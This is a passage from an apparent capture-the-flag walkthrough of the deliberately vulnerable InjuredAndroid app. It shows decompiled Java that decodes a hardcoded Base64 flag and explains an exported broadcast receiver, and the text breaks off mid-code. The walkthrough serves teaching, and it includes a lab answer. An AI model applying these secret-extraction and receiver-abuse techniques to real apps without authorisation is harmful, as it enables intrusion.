        C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;editText&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;editText2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        String obj &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; editText&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#fec418&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;[]&lt;/span&gt; a &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; C1489g&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4070a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;decoder.getData()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m885a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;obj&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; C2759c&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f6854a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)))&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            Intent intent &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; FlagOneSuccess&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4086I&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;flagFourButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
            startActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above,we are are getting user input and comparing with bytes in variable a. To understand the logic we analyze the method &lt;em&gt;&lt;strong&gt;c1489g&lt;/strong&gt;&lt;/em&gt; and member class &lt;em&gt;&lt;strong&gt;m4070a&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;C1489g&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color:#776e71&#34;&gt;/* renamed from: a */&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;[]&lt;/span&gt; f4499a &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; Base64&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;NF9vdmVyZG9uZV9vbWVsZXRz&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color:#776e71&#34;&gt;/* renamed from: a */&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;m4070a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4499a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the public class &lt;strong&gt;c1489g&lt;/strong&gt;, it implements base64 decoding of the byte string and returned to the &lt;strong&gt;submitFlag&lt;/strong&gt; class .&lt;/p&gt;
&lt;p&gt;To get the string we are returning we need to decode the encoded string using base64 utility installed in linux .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ echo &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;NF9vdmVyZG9uZV9vbWVsZXRz&amp;#34;&lt;/span&gt; | base64 -d
4_overdone_omelets
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our flag is :  &lt;strong&gt;4_overdone_omelets&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-five---exported-broadcast-receivers&#34;&gt;FLAG FIVE - EXPORTED BROADCAST RECEIVERS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; &lt;strong&gt;Understand how Broadcast receivers work&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Applications receive broadcasts in two ways:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Through manifest-declared receivers.&lt;/li&gt;
&lt;li&gt;Context-registered receivers.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Manifest-declared receivers - This type causes the system to launch application when broadcast is received. Searching in AndroidManifest.xml file we get where our broadcast is declared.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;receiver&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;b3nac.injuredandroid.FlagFiveReceiver&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:exported=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;activity&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:theme=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;@style/AppTheme.NoActionBar&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:label=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;@string/title_activity_flag_five&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;b3nac.injuredandroid.FlagFiveActivity&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to understand the Broadcast receivers, we need to analyze the &lt;strong&gt;oncreate()&lt;/strong&gt; method in the &lt;strong&gt;FlagFiveActivity.java&lt;/strong&gt; file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        setContentView&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;activity_flag_five&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        m8078C&lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;Toolbar&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;toolbar&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;FloatingActionButton&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;fab&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// from class: b3nac.injuredandroid.c
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#5bc4bf&#34;&gt;@Override&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// android.view.View.OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                FlagFiveActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4118G&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;  
            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;});&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; ComponentName&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; FlagFiveReceiver&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        getPackageManager&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
        C0310a&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m8404b&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m8403c&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4409x&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; IntentFilter&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;((&lt;/span&gt;Button&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;button9&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// from class: b3nac.injuredandroid.b
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#5bc4bf&#34;&gt;@Override&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// android.view.View.OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
                FlagFiveActivity&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4117H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;   &lt;span style=&#34;color:#776e71&#34;&gt;// invokes the intent
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#5bc4bf&#34;&gt;});&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above code, when we click flag2 button, we invoke intent which is defined in class  &lt;em&gt;&lt;strong&gt;m4117H&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;An intent is used to perform an action on the screen. Therefore clicking the button element in our application we are invoking an new intent. Intents are used for sending a broadcast receiver.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt; &lt;span style=&#34;color:#776e71&#34;&gt;/* renamed from: H */&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;/* synthetic */&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;m4117H&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        m4119F&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;m4119F&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        sendBroadcast&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the component name  &lt;strong&gt;FlagFiveReceiver&lt;/strong&gt; class. when the intent is invoked twice, we receive our flag. The class implements a conditional if else loop condition for checking the number of intents. when the correct flag is displayed, the intents counter is set to zero( &lt;strong&gt;i2 = 0&lt;/strong&gt;), where &lt;strong&gt;i2&lt;/strong&gt; variable is the intent counter as shown in the java code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;FlagFiveReceiver&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;extends&lt;/span&gt; BroadcastReceiver &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color:#776e71&#34;&gt;/* renamed from: a */&lt;/span&gt;
    &lt;span style=&#34;color:#815ba4&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; f4410a&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;

    &lt;span style=&#34;color:#5bc4bf&#34;&gt;@Override&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;// android.content.BroadcastReceiver
&lt;/span&gt;&lt;span style=&#34;color:#776e71&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#815ba4&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;onReceive&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;Context context&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; Intent intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
        String str&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m881e&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;context&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m881e&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#5bc4bf&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;intent&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        ApplicationC1492j&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f4506j&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;m4062a&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; i2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; f4410a&lt;span style=&#34;color:#5bc4bf&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;i2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;
            StringBuilder sb &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;new&lt;/span&gt; StringBuilder&lt;span style=&#34;color:#5bc4bf&#34;&gt;();&lt;/span&gt;
